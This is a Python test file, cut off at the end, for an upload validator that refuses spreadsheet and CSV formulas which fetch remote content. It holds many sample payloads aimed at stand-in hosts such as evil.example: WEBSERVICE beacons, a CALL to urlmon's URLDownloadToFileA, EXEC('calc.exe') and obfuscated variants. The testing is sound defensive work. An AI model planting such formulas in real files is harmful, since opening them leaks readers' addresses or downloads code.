"""Spreadsheet formulas that fetch remote content or call out (adversarial review of 73ff1e3,
L8, R160; and its review round 1).
Before, only DDE-shaped formulas were refused; a cell such as `=WEBSERVICE("http://evil/")`,
`=IMAGE("https://evil/p.png")`, `=RTD(...)`, `=CALL(...)` or a Google-Sheets `=IMPORTDATA(...)`
was accepted in both .xlsx (formula text was never parsed) and .csv (only DDE was refused), so
a reader who opens the file beacons their address out. These functions are now refused, in a
workbook's `<f>`/`<definedName>` text and in a CSV formula cell. HYPERLINK stays allowed: it
fetches nothing until someone clicks it (the docs now say a link can be followed by a click).

The recogniser is exercised directly (no database), as TestXmlBounds does; one end-to-end
upload smoke test covers the wiring through the API."""

from __future__ import annotations

import codecs
import csv
import io
import random
import time
import tracemalloc
import zipfile
from urllib.parse import quote

import pytest

from arkray.activities import storage
from tests.cpu_scale import bound, slowdown

DECLARATION = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
MAIN = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"
WORKSHEET = "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"
TABLE = "application/vnd.openxmlformats-officedocument.spreadsheetml.table+xml"
SM = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"


def package(parts: dict[str, str | bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as built:
        for name, content in parts.items():
            built.writestr(name, content)
    return out.getvalue()


def content_types(*overrides: tuple[str, str]) -> bytes:
    return (
        f'{DECLARATION}<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
        'content-types"><Default Extension="xml" ContentType="application/xml"/>'
        + "".join(f'<Override PartName="{p}" ContentType="{t}"/>' for p, t in overrides)
        + "</Types>"
    ).encode()


def workbook(sheet_body: str, *, defined: str = "") -> bytes:
    names = f"<definedNames>{defined}</definedNames>" if defined else ""
    return package(
        {
            "[Content_Types].xml": content_types(
                ("/xl/workbook.xml", MAIN), ("/xl/worksheets/sheet1.xml", WORKSHEET)
            ),
            "xl/workbook.xml": f"<workbook xmlns='{SM}'>{names}</workbook>",
            "xl/worksheets/sheet1.xml": (
                f"<worksheet xmlns='{SM}'><sheetData>{sheet_body}</sheetData></worksheet>"
            ),
        }
    )


def cell(formula: str) -> str:
    return f"<row r='1'><c r='A1'><f>{formula}</f><v>0</v></c></row>"


@pytest.fixture(autouse=True)
def deadline_at_this_speed(monkeypatch):
    """The upload's CPU deadline scaled like the bounds (tests/cpu_scale.py): an ordinary large
    workbook a slow, traced runner checks in more than the laptop's seconds must still pass."""
    monkeypatch.setattr(storage, "UPLOAD_CPU_SECONDS", storage.UPLOAD_CPU_SECONDS * slowdown())


def recognise(ext: str, content: bytes) -> object:
    """The catalog check for `ext`: True, False, or the refusal message."""
    try:
        return storage.CATALOG[ext].recognise(content[:8192], io.BytesIO(content))
    except storage.RejectedFile as refused:
        return str(refused)


FETCHING = [
    'WEBSERVICE("http://evil.example/b")',
    '_xlfn.WEBSERVICE("http://evil.example/b")',  # future-function prefix, as xlsx stores it
    '_xlfn._xlws.IMAGE("https://evil.example/p.png")',
    "IMAGE(A1)",
    'RTD("x",,"a")',
    'CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://e/x",0,0)',
    'REGISTER("k","u","JCJ","F","a",1,9)',
    "REGISTER.ID(A1,B1)",
    'EXEC("calc.exe")',
    'IMPORTDATA("https://evil.example/d.csv")',
    'IMPORTXML("https://evil.example/","//a")',
    'IMPORTHTML("https://evil.example/","table",1)',
    'IMPORTRANGE("key","A1")',
    'webservice("http://evil.example/")',  # case does not matter
    'A1+WEBSERVICE("http://e/")',  # not at the start of the formula
    'WEB&#83;ERVICE("http://evil.example/")',  # a character reference for an 'S'
]
ALLOWED_FORMULAS = [
    "SUM(A1:A3)",
    'HYPERLINK("https://lab.example/strips","strips")',  # only on a click: kept
    'A1&amp;" WEBSERVICE of the year"',  # the word in a string literal, not a call
    "MYIMAGE(A1)",  # a defined name that merely ends in IMAGE
    "IMAGELOOKUP(A1)",
    "AVERAGE(B1:B9)",
]


class TestXlsxFormulas:
    @pytest.mark.parametrize("formula", FETCHING, ids=range(len(FETCHING)))
    def test_a_fetching_formula_is_refused(self, formula):
        assert recognise("xlsx", workbook(cell(formula))) == storage.FORMULA_REFUSED

    def test_a_fetching_defined_name_is_refused(self):
        content = workbook(
            cell("A2"), defined='<definedName name="x">WEBSERVICE("http://e/")</definedName>'
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    def test_a_fetching_table_formula_is_refused(self):
        content = package(
            {
                "[Content_Types].xml": content_types(
                    ("/xl/workbook.xml", MAIN),
                    ("/xl/worksheets/sheet1.xml", WORKSHEET),
                    ("/xl/tables/table1.xml", TABLE),
                ),
                "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
                "xl/worksheets/sheet1.xml": f"<worksheet xmlns='{SM}'><sheetData/></worksheet>",
                "xl/tables/table1.xml": (
                    f"<table xmlns='{SM}'><tableColumns><tableColumn id='1'>"
                    '<calculatedColumnFormula>WEBSERVICE("http://e/")</calculatedColumnFormula>'
                    "</tableColumn></tableColumns></table>"
                ),
            }
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize("formula", ALLOWED_FORMULAS, ids=range(len(ALLOWED_FORMULAS)))
    def test_ordinary_formulas_pass(self, formula):
        assert recognise("xlsx", workbook(cell(formula))) is True

    def test_a_utf16_worksheet_is_read(self):
        xml = (
            f"<worksheet xmlns='{SM}'><sheetData>{cell('WEBSERVICE("http://e/")')}"
            "</sheetData></worksheet>"
        ).replace("UTF-8", "UTF-16")
        content = package(
            {
                "[Content_Types].xml": content_types(
                    ("/xl/workbook.xml", MAIN), ("/xl/worksheets/sheet1.xml", WORKSHEET)
                ),
                "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
                "xl/worksheets/sheet1.xml": codecs.BOM_UTF16_LE
                + (DECLARATION.replace("UTF-8", "UTF-16") + xml).encode("utf-16-le"),
            }
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    def test_a_worksheet_past_the_work_budget_is_refused(self, monkeypatch):
        """Parsing is bounded by the formula scan's own work budget (SHEET_XML_WORK): a worksheet
        that has to be parsed (a character reference makes it one) is refused once the budget is
        spent, never read on without limit."""
        monkeypatch.setattr(storage, "SHEET_XML_WORK", 2_000)
        content = workbook(cell("SUM(A1:A3)") * 5_000 + cell('A1&amp;"&#65;"'))
        assert recognise("xlsx", content) == storage.TOO_LARGE_TO_CHECK

    def test_a_large_worksheet_stays_within_bounded_memory(self):
        content = workbook(cell("SUM(A1:A3)") * 200_000)  # ~7.5 MB of XML
        tracemalloc.start()
        try:
            outcome = recognise("xlsx", content)
            peak = tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()
        assert outcome in (True, storage.TOO_LARGE_TO_CHECK)
        assert peak < 48 * 1024 * 1024, peak


def csv_outcome(text: str | bytes) -> object:
    data = text.encode() if isinstance(text, str) else text
    return recognise("csv", data)


class TestCsvFormulaCalls:
    DANGEROUS = [
        '=WEBSERVICE("http://evil.example/b")',
        '=_xlfn.WEBSERVICE("http://evil.example/b")',
        '=IMAGE("https://evil.example/p.png")',
        '@RTD("x",,"a")',
        "-1+CALL(1)",
        '+IMPORTDATA("https://evil.example/d.csv")',
        '=webservice("http://evil.example/")',  # case
        '=A1+IMAGE("https://e/p.png")',  # not at the start
    ]
    ORDINARY = [
        "=SUM(A1:A3)",
        '=HYPERLINK("https://lab.example/?a=1","open")',  # a click only: kept
        "=A1&B1",
        '=A1&" webservice "&B1',  # the word as text, not a call
        "City Lab WEBSERVICE notes",  # not a formula cell at all
        "@name",
        "-5",
        # Review round 1, PARSERS-3: notes that start like a formula but call nothing (Excel needs
        # the "(" right after a function's name).
        "-Call (follow-up) with lab manager",
        "- call (re pricing) next week",
        "+Image (brochure) attached",
        "@Asha call (urgent)",
        "- Register (new site) pending",
        '="see IMAGE(1) in the brochure"',  # the name and its bracket inside a string literal
        "=MYIMAGE(1)",
        "=A1.IMAGE(1)",
    ]

    @pytest.mark.parametrize("cell_text", DANGEROUS, ids=range(len(DANGEROUS)))
    def test_a_fetching_csv_cell_is_refused(self, cell_text):
        row = '"' + cell_text.replace('"', '""') + '"'
        assert csv_outcome(f"name,formula\nCity Lab,{row}\n") == storage.FORMULA_REFUSED

    def test_leading_whitespace_and_a_bom(self):
        assert csv_outcome('name,formula\nCity Lab," \t=WEBSERVICE(""http://e/"")"\n') == (
            storage.CSV_FORMULA_REFUSED
        )
        assert csv_outcome(chr(0xFEFF) + '=IMAGE("https://e/p.png")\n') == storage.FORMULA_REFUSED

    @pytest.mark.parametrize("sep", [",", ";", "\t"])
    def test_whatever_separates_the_cells(self, sep):
        content = f'name{sep}formula\nCity Lab{sep}=WEBSERVICE("http://e/")\n'
        assert csv_outcome(content) == storage.FORMULA_REFUSED

    def test_sep_line_separator(self):
        assert csv_outcome('sep=#\nname#formula\nCity Lab#=IMAGE("https://e/p.png")\n') == (
            storage.CSV_FORMULA_REFUSED
        )

    def test_ordinary_cells_pass(self):
        rows = "\n".join(
            f'City Lab {n},"{c.replace(chr(34), chr(34) * 2)}"' for n, c in enumerate(self.ORDINARY)
        )
        assert csv_outcome(f"name,value\n{rows}\n") is True

    def test_a_long_fetching_formula_fails_closed(self):
        cell_text = '=WEBSERVICE("http://e/?' + "a" * (storage.CSV_FIELD_CHARS + 1000) + '")'
        assert csv_outcome(f"name,formula\nx,{cell_text}\n") in (
            storage.FORMULA_REFUSED,
            storage.CSV_DDE_REFUSED,
        )

    def test_bounded_memory_whatever_the_shape(self):
        shapes = [
            "name,formula\n" + "City,=SUM(A1)\n" * 200_000,  # many ordinary formula cells
            "=a," * 600_000 + "\n",  # one row of many short formula cells
        ]
        for text in shapes:
            tracemalloc.start()
            try:
                outcome = csv_outcome(text)
                peak = tracemalloc.get_traced_memory()[1]
            finally:
                tracemalloc.stop()
            assert outcome is True
            assert peak < 8 * 1024 * 1024, peak


@pytest.mark.django_db
class TestUploadSmoke:
    """End-to-end through the upload API (run by the lead's full suite)."""

    def upload(self, client, note, name, content):
        return client.post(
            f"/api/v1/workspaces/me/activities/{note.pk}/attachments",
            content,
            content_type="application/octet-stream",
            HTTP_X_FILENAME=quote(name, safe=""),
        )

    @pytest.fixture
    def note(self, user_a):
        from tests.factories import LeadFactory, NoteFactory, OpportunityFactory

        lead = LeadFactory(owner=user_a)
        return NoteFactory(lead=lead, opportunity=OpportunityFactory(lead=lead), created_by=user_a)

    def test_a_fetching_xlsx_is_refused(self, user_a_client, note):
        content = workbook(cell('WEBSERVICE("http://evil.example/")'))
        assert self.upload(user_a_client, note, "a.xlsx", content).status_code == 400

    def test_a_fetching_csv_is_refused(self, user_a_client, note):
        content = b'name,formula\nCity,"=WEBSERVICE(""http://evil.example/"")"\n'
        assert self.upload(user_a_client, note, "list.csv", content).status_code == 400


# --- review round 1 -------------------------------------------------------------------------------
PREFIXED = (
    "<x:worksheet xmlns:x='" + SM + "'><x:sheetData><x:row r='1'><x:c r='A1'><x:f>{}</x:f>"
    "<x:v>0</x:v></x:c></x:row></x:sheetData></x:worksheet>"
)
PIVOT = "application/vnd.openxmlformats-officedocument.spreadsheetml.pivotCacheDefinition+xml"
MACRO_SHEET = "application/vnd.ms-excel.macrosheet+xml"
CONNECTIONS = "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml"
QUERY_TABLE = "application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml"
EXTERNAL_LINK = "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def sheet_part(xml: str, *, path: str = "xl/worksheets/sheet1.xml", **declared: str) -> bytes:
    """A workbook whose worksheet part is `xml` at `path`, declared by an Override unless a
    Default is given (`default="ext"`), with extra overrides from `declared` (path=type)."""
    overrides = [("/xl/workbook.xml", MAIN)]
    defaults = ""
    if "default" in declared:
        defaults = f'<Default Extension="{declared.pop("default")}" ContentType="{WORKSHEET}"/>'
    else:
        overrides.append((f"/{path}", WORKSHEET))
    overrides += [(f"/{name}", kind) for name, kind in declared.items()]
    types = (
        f'{DECLARATION}<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
        f'content-types">{defaults}<Default Extension="xml" ContentType="application/xml"/>'
        + "".join(f'<Override PartName="{p}" ContentType="{t}"/>' for p, t in overrides)
        + "</Types>"
    )
    return package(
        {
            "[Content_Types].xml": types,
            "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
            path: xml,
        }
    )


def worksheet(rows: str, extra: str = "") -> str:
    return f"<worksheet xmlns='{SM}'><sheetData>{rows}</sheetData>{extra}</worksheet>"


class TestXlsxReviewRound1:
    @pytest.mark.parametrize("formula", FETCHING, ids=range(len(FETCHING)))
    def test_a_prefixed_formula_element_is_read(self, formula):
        """PARSERS-2: <x:f> under a namespace prefix (the Open XML SDK writes them) was never
        parsed: the pre-filter wanted a literal "<f>"."""
        assert recognise("xlsx", sheet_part(PREFIXED.format(formula))) == storage.FORMULA_REFUSED

    def test_prefixed_defined_names_and_table_formulas(self):
        defined = package(
            {
                "[Content_Types].xml": content_types(("/xl/workbook.xml", MAIN)),
                "xl/workbook.xml": f"<x:workbook xmlns:x='{SM}'><x:definedNames><x:definedName"
                " name='n'>WEBSERVICE(\"http://e/\")</x:definedName></x:definedNames>"
                "</x:workbook>",
            }
        )
        assert recognise("xlsx", defined) == storage.FORMULA_REFUSED
        table = package(
            {
                "[Content_Types].xml": content_types(
                    ("/xl/workbook.xml", MAIN), ("/xl/tables/t.xml", TABLE)
                ),
                "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
                "xl/tables/t.xml": f"<t:table xmlns:t='{SM}'><t:tableColumns><t:tableColumn"
                " id='1'><t:totalsRowFormula>IMAGE(\"https://e/p.png\")</t:totalsRowFormula>"
                "</t:tableColumn></t:tableColumns></t:table>",
            }
        )
        assert recognise("xlsx", table) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        ("label", "content"),
        [
            ("default-extension", sheet_part(worksheet(cell("IMAGE(1)")), path="xl/s1.sht",
                                             default="sht")),
            ("override-unusual-path", sheet_part(worksheet(cell("IMAGE(1)")), path="data/s.xml")),
            ("default-xml-as-worksheet", sheet_part(worksheet(cell("IMAGE(1)")), default="xml")),
            ("override-upper-case", package({
                "[Content_Types].xml": content_types(
                    ("/xl/workbook.xml", MAIN), ("/XL/WORKSHEETS/SHEET1.XML", WORKSHEET)),
                "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
                "xl/worksheets/sheet1.xml": worksheet(cell("IMAGE(1)")),
            })),
            ("override-percent-encoded", package({
                "[Content_Types].xml": content_types(
                    ("/xl/workbook.xml", MAIN), ("/xl/worksheets/sheet%31.xml", WORKSHEET)),
                "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
                "xl/worksheets/sheet1.xml": worksheet(cell("IMAGE(1)")),
            })),
        ],
        ids=lambda value: value if isinstance(value, str) else "",
    )  # fmt: skip
    def test_a_sheet_is_found_by_its_declared_type(self, label, content):
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "rows",
        [
            # A shared formula: the master holds the text, the others refer to it.
            "<row r='1'><c r='A1'><f t='shared' ref='A1:A3' si='0'>WEBSERVICE(B1)</f></c></row>"
            "<row r='2'><c r='A2'><f t='shared' si='0'/></c></row>",
            "<row r='1'><c r='A1'><f t='array' ref='A1:A3'>IMAGE(B1:B3)</f></c></row>",
            "<row r='1'><c r='A1'><f>WEB<!-- split -->SERVICE(B1)</f></c></row>",
            "<row r='1'><c r='A1'><f><![CDATA[WEBSERVICE(B1)]]></f></c></row>",
            "<row r='1'><c r='A1'><f>WEB<?split here?>SERVICE(B1)</f></c></row>",
            "<row r='1'><c r='A1'><f>IMAGE (B1)</f></c></row>",  # blanks before its bracket
            "<row r='1'><c r='A1'><f>IMAGE\n(B1)</f></c></row>",
            "<row r='1'><c r='A1'><f>_xlfn._xlws.IMAGE(B1)</f></c></row>",
            "<row r='1'><c r='A1'><f>IM&#65;GE(B1)</f></c></row>",
        ],
        ids=["shared", "array", "comment", "cdata", "pi", "blank", "newline", "prefixes", "ref"],
    )
    def test_formula_shapes(self, rows):
        assert recognise("xlsx", sheet_part(worksheet(rows))) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "extra",
        [
            "<dataValidations count='1'><dataValidation type='list' sqref='B1'>"
            '<formula1>WEBSERVICE("http://e/")</formula1></dataValidation></dataValidations>',
            "<conditionalFormatting sqref='A1'><cfRule type='expression' priority='1'>"
            '<formula>IMAGE("https://e/p.png")&gt;0</formula></cfRule></conditionalFormatting>',
            "<extLst><ext uri='{x}'><x14:dataValidations xmlns:x14='urn:x14'"
            ' xmlns:xm=\'urn:xm\'><x14:dataValidation><x14:formula1><xm:f>RTD("x",,"y")</xm:f>'
            "</x14:formula1></x14:dataValidation></x14:dataValidations></ext></extLst>",
        ],
        ids=["data-validation", "conditional-format", "x14-validation"],
    )
    def test_validation_and_conditional_format_formulas(self, extra):
        content = sheet_part(worksheet(cell("SUM(A1)"), extra))
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    def test_a_pivot_cache_calculated_field(self):
        cache = (
            f"<pivotCacheDefinition xmlns='{SM}'><cacheFields count='1'><cacheField name='c'"
            " formula='WEBSERVICE(&quot;http://e/&quot;)'/></cacheFields></pivotCacheDefinition>"
        )
        part = "xl/pivotCache/pivotCacheDefinition1.xml"
        members = _members(sheet_part(worksheet(""), **{part: PIVOT}))
        fetching = package({**members, part: cache})
        assert recognise("xlsx", fetching) == storage.FORMULA_REFUSED
        ordinary = package(
            {**members, part: cache.replace("WEBSERVICE(&quot;http://e/&quot;)", "Sales*2")}
        )
        assert recognise("xlsx", ordinary) is True

    @pytest.mark.parametrize(
        ("label", "part", "kind"),
        [
            ("macro-sheet", "xl/macrosheets/sheet1.xml", MACRO_SHEET),
            ("connections", "xl/connections.xml", CONNECTIONS),
            ("query-table", "xl/queryTables/queryTable1.xml", QUERY_TABLE),
            ("external-link", "xl/links/link1.xml", EXTERNAL_LINK),
        ],
        ids=["macro-sheet", "connections", "query-table", "external-link"],
    )
    def test_declared_active_parts_are_refused(self, label, part, kind):
        body = (
            "<connections><connection id='1'><webPr url='https://evil.example/q'/>"
            "</connection></connections>"
        )
        content = sheet_part(worksheet(cell("SUM(A1)")), **{part: kind})
        content = package({**_members(content), part: body})
        assert recognise("xlsx", content) is False

    def test_a_query_table_relationship_is_refused(self):
        content = package(
            {
                **_members(sheet_part(worksheet(cell("SUM(A1)")))),
                "xl/worksheets/_rels/sheet1.xml.rels": (
                    "<Relationships xmlns='http://schemas.openxmlformats.org/package/2006/"
                    f"relationships'><Relationship Id='r1' Type='{R}queryTable'"
                    " Target='../queryTables/queryTable1.xml'/></Relationships>"
                ),
                "xl/queryTables/queryTable1.xml": "<queryTable connectionId='1'/>",
            }
        )
        assert recognise("xlsx", content) is False

    def test_names_in_shared_strings_are_text(self):
        """The shared strings are not a formula part: a note that says IMAGE(2) is text."""
        content = package(
            {
                **_members(sheet_part(worksheet(cell("SUM(A1)")))),
                "xl/sharedStrings.xml": f"<sst xmlns='{SM}'><si><t>see IMAGE(2)</t></si></sst>",
            }
        )
        assert recognise("xlsx", content) is True


def _members(content: bytes) -> dict[str, str | bytes]:
    with zipfile.ZipFile(io.BytesIO(content)) as built:
        return {name: built.read(name) for name in built.namelist()}


class TestLargeWorkbooks:
    """Review round 1, item A: the sheet scan has its own budget, and a sheet that can't hold a
    fetching call is read, never parsed, so ordinary large workbooks pass; what is parsed stays
    bounded."""

    @staticmethod
    def numbers(cells: int, extra: str = "") -> bytes:
        rows = "".join(f"<row r='{i}'><c r='A{i}'><v>{i}</v></c></row>" for i in range(1, cells))
        return sheet_part(worksheet(rows + cell("SUM(A1:A9)") + extra))

    def test_400k_numeric_cells_and_a_sum_pass_quickly(self, monkeypatch):
        content = self.numbers(400_000)
        parsed = []
        stream = storage._stream_story

        def streamed(*args):
            if isinstance(args[2], storage._Formulas):  # a sheet, not the small XML parts (round 3)
                parsed.append(args)
            return stream(*args)

        monkeypatch.setattr(storage, "_stream_story", streamed)
        started = time.process_time()
        assert recognise("xlsx", content) is True
        assert time.process_time() - started < bound(1)  # about 0.3 s at full clock
        assert parsed == []  # read, never parsed

    def test_a_large_sheet_that_must_be_parsed_stays_bounded(self):
        content = self.numbers(400_000, cell('A1&amp;"&#65;"'))  # a reference: it is parsed
        started = time.process_time()
        outcome = recognise("xlsx", content)
        assert time.process_time() - started < bound(2)  # the upload's work pool: about a second
        assert outcome in (True, storage.TOO_LARGE_TO_CHECK)
        # Its memory, in a second run: tracemalloc slows what it traces two to three times.
        tracemalloc.start()
        try:
            recognise("xlsx", content)
            peak = tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()
        assert peak < 48 * 1024 * 1024, peak

    def test_past_the_sheet_byte_budget_it_is_refused_unread(self, monkeypatch):
        monkeypatch.setattr(storage, "SHEET_XML_BYTES", 64 * 1024)
        assert recognise("xlsx", self.numbers(20_000)) == storage.TOO_LARGE_TO_CHECK

    @pytest.mark.parametrize(
        "body",
        [
            "(" * 3_000_000,
            "e(" * 1_500_000,
            "image (" * 400_000,  # blanks before every bracket, after a name: refused
            "x (" * 1_000_000,  # blanks before every bracket: each run looked at, paid for
        ],
        ids=["brackets", "e-brackets", "spaced-names", "spaced-brackets"],
    )
    def test_dense_brackets_stay_bounded(self, body):
        content = sheet_part(worksheet(f"<row r='1'><c r='A1'><v>{body}</v></c></row>"))
        started = time.process_time()
        outcome = recognise("xlsx", content)
        assert outcome in (True, storage.TOO_LARGE_TO_CHECK, storage.FORMULA_REFUSED)
        assert time.process_time() - started < bound(2)  # review round 2: was < 10


# CSV: review round 1.
LIMIT = 10 * 1024 * 1024


def fill(unit: str, tail: str = "") -> bytes:
    return (unit * ((LIMIT - len(tail) - 16) // len(unit)) + tail).encode()[:LIMIT]


class TestCsvReviewRound1:
    def test_a_large_benign_csv_is_not_read_cell_by_cell(self, monkeypatch):
        """PARSERS-1: a 10 MB CSV of formulas cost 3.5-7.5 s; without a fetching name and its
        bracket in the file nothing is read cell by cell (a few byte searches)."""
        data = fill("=SUM(A1),+SUM(B2);-SUM(C3)\t@SUM(D4)\n")
        readings = []
        monkeypatch.setattr(storage, "_csv_calls_in", lambda *args: readings.append(args))
        started = time.process_time()
        assert storage._csv_formula_calls(io.BytesIO(data)) is False
        assert time.process_time() - started < bound(2)  # 0.05-0.1 s at full clock
        assert readings == []

    def test_one_mention_costs_only_its_field(self, monkeypatch):
        """With a fetching name somewhere, only the fields holding it are judged: a budget of a
        few thousand characters is enough for 10 MB of ordinary formula cells."""
        monkeypatch.setattr(storage, "CSV_CALL_WORK", 2_000)
        data = fill("=SUM(A1),+SUM(B2);-SUM(C3)\t@SUM(D4)\n", 'note,"see IMAGE(2) inside"\n')
        assert storage._csv_formula_calls(io.BytesIO(data)) is False
        refused = data + b'x,"=IMAGE(""https://e/p.png"")"\n'
        assert storage._csv_formula_calls(io.BytesIO(refused)) is True

    @pytest.mark.parametrize(
        "data",
        [
            fill('="IMAGE(",'),  # a candidate in every formula cell
            fill("IMAGE(,", "\n=1\n"),  # in every text cell
            fill('="IMAGE("&' + "e+" * 60_000 + ",", "\n"),  # long fields, each judged
            fill('"xIMA"GE(1),', "\n=1\n"),  # a quote-split name in every cell
            fill('="IMAGE(",;\t'),  # and every separator
        ],
        ids=["formula-cells", "text-cells", "long-fields", "split-names", "every-separator"],
    )
    def test_candidate_floods_stay_bounded(self, data):
        """Every field holding a candidate is judged, within CSV_CALL_WORK: the flood passes
        (nothing in it calls out) or is "too large to check", within the CPU bound. (Review
        round 2: since only formula fields are judged at full cost, some floods now pass.)"""
        started = time.process_time()
        assert csv_outcome(data) in (True, storage.TOO_LARGE_TO_CHECK)
        assert time.process_time() - started < bound(2)  # under 1 s at full clock

    @pytest.mark.parametrize(
        "data",
        [
            fill("=" + "(" * 120_000 + ";", "\nIMAGE(\n"),
            fill("=" + "E(" * 60_000 + ",", "\nIMAGE(\n"),
            fill("=" + "e+" * 60_000 + ",", "\nIMAGE(\n"),
            fill('"=' + 'SUM(""a"")+' * 11_000 + '",', "\nIMAGE(\n"),
            fill('"=' + '""a""&' * 20_000 + '",', "\nIMAGE(\n"),
        ],
        ids=["brackets", "e-brackets", "identifiers", "long-quoted", "literals"],
    )
    def test_worst_shapes_stay_bounded(self, data):
        started = time.process_time()
        assert csv_outcome(data) is True
        assert time.process_time() - started < bound(2)  # 0.1-0.6 s at full clock

    def test_a_long_formula_line_is_judged_not_refused(self):
        """PARSERS-7: a line longer than CSV_FIELD_CHARS read as one cell failed closed with
        FORMULA_REFUSED; Excel evaluates no formula over 8,192 characters, so its start is
        judged and the rest skipped."""
        line = "=" + "SUM(1)+" * (3 * storage.CSV_FIELD_CHARS // 7) + "1"  # over many chunks
        assert csv_outcome(line + "\nnote IMAGE(2) attached\n") is True
        long_call = '=IMAGE("https://e/?' + "a" * (storage.CSV_FIELD_CHARS + 10) + '")'
        assert csv_outcome(long_call + "\n") == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "data",
        [
            'a,"=A1"&IMAGE(1)\n',  # text after the closing quote joins the field
            'a,"=IMA"GE(1)\n',  # a name split by the closing quote
            'a,"=IMAGE"(1)\n',
            'a,"  "=IMAGE(1)\n',  # blanks quoted, the formula after the quote
            'a,"\n=IMAGE(1)"\n',  # a line break before the formula, inside quotes
            "a,\t=IMAGE(1)\n",  # a tab before it
            "a, @IMAGE(1)\n",
            chr(0xFEFF) + "sep=;\r\nname;formula\r\nCity;-1+CALL(1)\r\n",  # BOM, sep=, CRLF
            'a,"=IF(A1,""x"",IMAGE(B1))"\n',  # after a string literal, in a quoted cell
            "a,=_xlws.IMAGE(1)\n",
            "a,=REGISTER.ID(1)\n",
            # Read with another separator (Excel's in many regions), a line is one cell: the
            # line after the break is a cell of its own, a formula.
            'a,"line one\n=IMAGE(1)"\n',
        ],
        ids=[
            "continuation", "split", "split-before-bracket", "quoted-blanks", "newline",
            "tab", "at", "bom-sep-crlf", "after-literal", "xlws", "register-id",
            "line-after-a-break",
        ],
    )  # fmt: skip
    def test_quoting_and_layout(self, data):
        assert csv_outcome(data) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "data",
        [
            'a,"line one, =IMAGE(1)"\n',  # inside a quoted cell, after text: one text cell
            'a,"=""IMAGE(1)"""\n',  # a string literal
            "a,x=IMAGE(1)\n",  # not a formula cell
            'a, "=IMAGE(1)"\n',  # a blank before the quote: text to Excel
        ],
        ids=["text-cell", "literal", "not-formula", "blank-before-quote"],
    )
    def test_text_that_is_not_a_call(self, data):
        assert csv_outcome(data) is True

    def test_other_encodings_are_not_text(self):
        utf16 = '=IMAGE("https://e/p.png")\n'.encode("utf-16")
        assert csv_outcome(utf16) is False  # NUL bytes: not UTF-8 text
        latin1 = '=IMAGE("https://e/\xe9")\n'.encode("latin-1")
        assert csv_outcome(latin1) is False

    def test_differential_fuzz_against_the_csv_module(self):
        """Every call a reference finds is refused, and nothing else (review round 2: the check
        no longer refuses more than it judges). The reference reads each separator's cells with
        Python's csv module and judges each formula cell with the shared judge (_formula_calls),
        so what is tested is how the check finds and reads cells: the pre-search, the field walk,
        the candidates, the quoting. 600,000 inputs ran offline with no difference (SCRATCH
        fuzz_csv_calls_r2.py), 600,000 more with the round-3 value-only names
        (fuzz_csv_calls_r3.py); a few thousand run here."""
        rng = random.Random(20261012)
        tokens = [
            ",", ";", "\t", '"', '""', "'", "\n", "\r\n", "\r", " ", "=", "+", "-", "@",
            "(", ")", "&", ".", "IMAGE", "image", "IMA", "GE", "CALL", "_xlfn.", "x", "1",
            "A1", "SUM", "REGISTER", ".ID", "WEBSERVICE", "MAP(", "_xleta.", "[", "]", "!",
            chr(0xA0), chr(0xE9), "RTD", "EXEC", "(WEBSERVICE)", ")(", "*",  # round 3: values
        ]  # fmt: skip

        def formula_calls(field: str) -> bool:
            stripped = field.lstrip()
            if not stripped or stripped[0] not in "=+-@":
                return False
            return storage._formula_calls(stripped[1:], blanks=False, whole=False)[0]

        def reference(text: str) -> bool:
            if "(" not in text or not any(c in text for c in "=+-@"):
                return False
            first = text.split("\n", 1)[0][:64]
            sep = first[4] if first.startswith("sep=") and first[4:5] not in ("", "\r") else ""
            candidates = list(dict.fromkeys(d for d in (",", ";", "\t", sep) if d))
            present = [d for d in candidates if d in text]
            for d in present + [d for d in candidates if d not in text][:1]:
                rows = csv.reader(io.StringIO(text, newline=""), delimiter=d, strict=False)
                if any(formula_calls(f) for row in rows for f in row):
                    return True
            return False

        differences = []
        for _ in range(3_000):
            text = "".join(rng.choice(tokens) for _ in range(rng.randint(1, 24)))
            if rng.random() < 0.1:
                text = "sep=" + rng.choice(";#,") + "\n" + text
            try:
                found = storage._csv_formula_calls(io.BytesIO(text.encode()))
            except storage.RejectedFile:
                found = True
            if reference(text) != found:
                differences.append(text)
        assert differences == []


# --- review round 2 (PARSERS2-5, PARSERS2-6, templates) ------------------------------------------
CHART = "application/vnd.openxmlformats-officedocument.drawingml.chart+xml"
TEMPLATE_MAIN = "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml"
CHART_NS = "http://schemas.openxmlformats.org/drawingml/2006/chart"
REL_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def named_sheets(*names: str, defined: str = "") -> str:
    sheets = "".join(
        f"<sheet name=\"{name}\" sheetId='{n}' r:id='rId{n}'/>" for n, name in enumerate(names, 1)
    )
